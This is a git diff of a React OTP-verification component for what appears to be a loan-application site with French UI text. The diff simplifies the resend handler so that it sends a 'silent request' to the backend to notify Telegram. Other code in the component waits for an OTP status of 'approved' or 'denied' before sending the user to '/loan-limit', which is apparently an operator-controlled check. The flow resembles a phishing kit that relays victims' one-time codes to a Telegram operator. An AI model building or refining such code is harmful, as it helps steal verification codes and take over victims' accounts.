@@ -72,7 +72,6 @@ const OTPVerification = () => {
             setIsVerifying(false);
             
             if (statusData.status === "approved") {
-              // ✅ Goes directly to Loan Limit now
               navigate("/loan-limit", { state: { phone: phoneNumber } });
             } else if (statusData.status === "denied") {
               setOtp(["", "", "", ""]);
@@ -96,53 +95,20 @@ const OTPVerification = () => {
   const handleResend = async () => {
     if (timeLeft > 0 || isVerifying) return;
     
-    setIsVerifying(true);
-    setOtp(["", "", "", ""]); 
-
-    const timeoutId = setTimeout(() => {
-      setIsVerifying(false);
-      setTimeLeft(0); 
-    }, 45000);
+    // ✅ Clear inputs and reset timer immediately
+    setOtp(["", "", "", ""]);
+    setTimeLeft(45); 
+    inputRefs.current[0]?.focus();
 
     try {
-      const res = await fetch(`${API_URL}/api/resend-otp`, {
+      // ✅ Send silent request to backend to notify Telegram
+      await fetch(`${API_URL}/api/resend-otp`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ phone_number: phoneNumber }),
       });
-      const data = await res.json();
-      
-      if (data.status === "pending" && data.otp_id) {
-        setTimeLeft(45); 
-        
-        const interval = setInterval(async () => {
-          const statusRes = await fetch(`${API_URL}/api/otp-status/${data.otp_id}`);
-          const statusData = await statusRes.json();
-          
-          if (statusData.status !== "pending") {
-            clearInterval(interval);
-            clearTimeout(timeoutId);
-            setIsVerifying(false);
-            
-            if (statusData.status === "approved") {
-              // ✅ Goes directly to Loan Limit now
-              navigate("/loan-limit", { state: { phone: phoneNumber } });
-            } else if (statusData.status === "denied") {
-              setOtp(["", "", "", ""]);
-              setTimeLeft(0); 
-              inputRefs.current[0]?.focus();
-            }
-          }
-        }, 2000);
-      } else {
-        clearTimeout(timeoutId);
-        setIsVerifying(false);
-        setTimeLeft(0);
-      }
     } catch (error) {
-      clearTimeout(timeoutId);
-      setIsVerifying(false);
-      setTimeLeft(0);
+      console.error("Error sending resend request", error);
     }
   };
 
@@ -214,7 +180,7 @@ const OTPVerification = () => {
               padding: 0
             }}
           >
-            {isVerifying ? "Envoi..." : timeLeft > 0 ? `Renvoyer dans ${timeLeft}s` : "Renvoyer le code"}
+            {timeLeft > 0 ? `Renvoyer dans ${timeLeft}s` : "Renvoyer le code"}
           </button>
         </div>
       </div>
